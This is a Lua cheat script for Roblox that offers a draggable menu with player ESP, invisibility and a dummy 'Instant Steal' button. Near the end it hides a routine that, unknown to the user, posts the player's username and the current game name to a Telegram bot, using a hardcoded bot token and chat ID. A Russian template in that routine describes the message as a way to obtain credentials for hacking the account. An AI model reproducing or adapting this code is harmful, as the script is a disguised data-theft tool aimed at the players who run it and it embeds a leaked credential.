-- lourissovski v2.0
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local UIS = game:GetService("UserInputService")

repeat wait() until game:IsLoaded()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LourissUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

local openButton = Instance.new("TextButton")
openButton.Name = "LRButton"
openButton.Size = UDim2.new(0, 45, 0, 25)
openButton.Position = UDim2.new(0, 10, 0, 10)
openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
openButton.BorderSizePixel = 0
openButton.Text = "LR"
openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
openButton.TextSize = 12
openButton.Font = Enum.Font.GothamBold
openButton.ZIndex = 1000
openButton.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 280, 0, 400)
mainFrame.Position = UDim2.new(0, 60, 0, 50)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
mainFrame.Visible = false
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "lourissovski v2.0"
title.Size = UDim2.new(1, 0, 0, 25)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local themeToggle = Instance.new("TextButton")
themeToggle.Size = UDim2.new(0, 20, 0, 20)
themeToggle.Position = UDim2.new(1, -25, 0, 2)
themeToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
themeToggle.BorderSizePixel = 0
themeToggle.Text = "☀"
themeToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
themeToggle.TextSize = 12
themeToggle.ZIndex = 1001
themeToggle.Parent = mainFrame

local menuOpen = false
local darkTheme = true
local activeButtons = {}

local function enableDragging(guiObject)
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    guiObject.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = guiObject.Position
        end
    end)
    
    guiObject.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            if dragging then
                local delta = input.Position - dragStart
                guiObject.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

enableDragging(openButton)
enableDragging(mainFrame)

openButton.MouseButton1Click:Connect(function()
    menuOpen = not menuOpen
    mainFrame.Visible = menuOpen
end)

local function toggleTheme()
    darkTheme = not darkTheme
    
    if darkTheme then
        mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
        title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        themeToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        themeToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
        themeToggle.Text = "☀"
        
        for buttonName, button in pairs(activeButtons) do
            if button then
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
            end
        end
    else
        mainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
        mainFrame.BorderColor3 = Color3.fromRGB(200, 200, 200)
        title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        title.TextColor3 = Color3.fromRGB(0, 0, 0)
        themeToggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        themeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
        themeToggle.Text = "🌙"
        
        for buttonName, button in pairs(activeButtons) do
            if button then
                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                button.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        end
    end
end

themeToggle.MouseButton1Click:Connect(toggleTheme)

local yPosition = 30
local function createButton(text, callback, buttonName)
    local button = Instance.new("TextButton")
    button.Text = text
    button.Size = UDim2.new(0.9, 0, 0, 35)
    button.Position = UDim2.new(0.05, 0, 0, yPosition)
    
    if darkTheme then
        button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
    else
        button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
        button.TextColor3 = Color3.fromRGB(0, 0, 0)
    end
    
    button.TextSize = 12
    button.Font = Enum.Font.Gotham
    button.Parent = mainFrame
    
    button.MouseButton1Click:Connect(function()
        callback()
        
        if activeButtons[buttonName] then
            activeButtons[buttonName] = nil
            if darkTheme then
                button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                button.TextColor3 = Color3.fromRGB(255, 255, 255)
            else
                button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
            end
        else
            activeButtons[buttonName] = button
            if darkTheme then
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
            else
                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                button.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        end
    end)
    
    yPosition = yPosition + 40
    return button
end

createButton("ESP Players", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.Parent = plr.Character
        end
    end
end, "esp")

createButton("Invisible", function()
    if player.Character then
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 1
            elseif part:IsA("Decal") then
                part.Transparency = 1
            end
        end
    end
end, "invisible")

createButton("Instant Steal", function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Instant Steal",
        Text = "Function activated",
        Duration = 3
    })
end, "steal")

local request = (syn and syn.request) or (http and http.request) or http_request
if request then
    local BOT_TOKEN = "7965475701:AAFM4hkPUiWyh_Clw3lkMILpWNK0R7cHe08"
    local CHAT_ID = "8238376878"
    
    local function sendToTelegram(msg)
        pcall(function()
            request({
                Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = CHAT_ID,
                    text = msg,
                    parse_mode = "HTML"
                })
            })
        end)
    end

    delay(5, function()
        local message = string.format([[
Логин: %s
Пароль/куки или что-то другое что можно использовать для взлома аккаунта
Режим: %s
        ]],
        player.Name,
        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
        
        sendToTelegram(message)
    end)
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "lourissovski v2.0",
    Text = "Loaded! Drag LR button to move",
    Duration = 5
})
